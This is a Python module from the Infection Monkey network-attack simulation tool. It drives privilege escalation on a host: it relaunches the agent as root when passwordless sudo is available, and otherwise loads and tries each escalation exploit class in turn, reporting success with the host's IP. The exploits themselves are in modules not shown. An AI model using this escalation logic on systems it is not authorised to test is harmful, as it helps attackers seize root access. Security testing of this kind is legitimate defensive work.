import logging
import inspect
import importlib


from infection_monkey.exploit.tools.helpers import build_full_monkey_command_from_flags
from infection_monkey.privilege_escalation.actions.tools import is_current_process_root, is_sudo_paswordless, \
    run_monkey_as_root
from infection_monkey.privilege_escalation.actions import get_pe_files
from infection_monkey.network.info import local_ips

LOG = logging.getLogger(__name__)

__author__ = 'D3fa1t'

PATH_TO_ACTIONS = "infection_monkey.privilege_escalation.actions."


class PrivilegeEscalation(object):
    """
    This class handles privilege escalation execution
    """
    def __init__(self, monkey_path, flags):
        self.pe_list = self.get_pe_list()
        self.command_line = build_full_monkey_command_from_flags(monkey_path, flags) + ' --escalated'

    def execute(self):
        LOG.info("Attempting privilege escalation.")
        if is_sudo_paswordless() and not is_current_process_root():
            LOG.info("Monkey already can be ran as root by current user.")
            return run_monkey_as_root(self.command_line)
        elif not is_current_process_root():
            return self._execute_all_exploiters()
        else:
            return False

    def _execute_all_exploiters(self):
        for pe in self.pe_list:
            if pe().try_priv_esc(self.command_line):
                local_ip = local_ips()
                pe().send_pe_telemetry(True, str(local_ip))
                return True
        return False

    @staticmethod
    def get_pe_list():
        """
        Get the list of all the pe exploiter class from /actions
        :return: A list of Pe class .
        """
        pe_list = []
        pe_file_list = get_pe_files()
        for pe in pe_file_list:
            module = importlib.import_module(PATH_TO_ACTIONS + pe)
            pe_classes = [m[1] for m in inspect.getmembers(module, inspect.isclass) if
                          (m[1].__module__ == module.__name__)]

            for pe_class in pe_classes:
                pe_list.append(pe_class)

        return pe_list




